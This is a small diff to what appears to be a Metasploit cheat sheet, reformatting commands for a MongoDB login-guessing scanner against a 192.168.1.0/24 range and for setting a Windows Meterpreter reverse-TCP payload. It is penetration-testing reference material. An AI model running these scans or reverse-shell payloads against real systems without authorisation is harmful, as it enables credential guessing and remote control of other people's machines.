@@ -20,16 +20,16 @@ search platform:exploit description:samsung
 ```
 
 ## Auxiliary
-```
-use  auxiliary/scanner/mongodb/mongodb_login
-set rhosts 192.168.1.0/24
-run
-```
+- Example
+  - ```use  auxiliary/scanner/mongodb/mongodb_login```
+  - ```set rhosts 192.168.1.0/24```
+  - ```run```
 
 
 ## Exploit
 - Change default payload
-  - ```show payloads``` & ```set payload windows/meterpreter/reverse_tcp```
+  - ```show payloads``` 
+  - ```set payload windows/meterpreter/reverse_tcp```
 
 ## Meterprete
 
